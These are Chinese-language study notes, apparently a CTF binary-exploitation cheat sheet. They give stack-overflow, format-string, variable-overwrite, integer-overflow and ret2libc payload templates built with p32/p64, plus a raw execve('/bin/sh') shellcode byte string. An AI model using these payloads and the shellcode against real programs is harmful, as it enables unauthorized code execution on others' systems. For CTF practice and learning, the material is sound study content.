计算偏移注意用的是16进制
p32/p64看系统情况用
不知道额外添加量就4、8、12逐渐试(32位4，64位8)(ebp4位)
覆盖长度=后面那个数的数值
执行任意函数：(覆盖长度+位偏移(4,8))*'a' + p32('system'的位置) + p32(0) + p32(/bin/sh的位置)
system('/bin/sh.):\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05
bss未初始化，地址固定
p32填入数字转为16进制再填

printf、get、strcpy、scanf、fgets:
ida确定需要覆盖的变量位置
找到可注入位置（printf所在地方），输入AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p，找到0x41414141是第几个（从1开始计算，不包括AAAA），就是注入偏移
修改%10$n运行gshzfc.py
p32需要补4个a，p64不需要，系统自带写入只需str(int(xx,16))即可不用p32p64
写数在前添加%85c
strcpy(dest,src) #src长于dest溢出，填充dest

变量覆盖（两个变量在同范围内，长度受限制无法溢出）：
ida，看两个变量偏移差距（只看第一个值的偏移，大的那个）
修改脚本：pyzr.py，内容：偏移*'a' + p32(需要写入的值)
如果变量是数组，把数组空间填满即可覆盖到目标变量
目标变量如果是指针，写入p32(需要执行的函数)，调用到函数时就会执行

跳转执行任意函数：
找到/bin/sh所在函数，F5后在下方看到函数地址
（执行位置长度+8）*a+函数地址

随机数rand:
重置seed参考：pyzr2.py

整数溢出（溢出后为负数）：
__int8最大为255位（ljust覆盖到260-264位
read最大为0x199位
read(0, &buf, 0x100u) #长度100，如果buf的缓冲区少于100就可以搞溢出了

无system、调用libc：
参考pyzr3.py
先发payload寻址：'A' * (偏移 + 4or8)  + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
然后计算后走常规路线
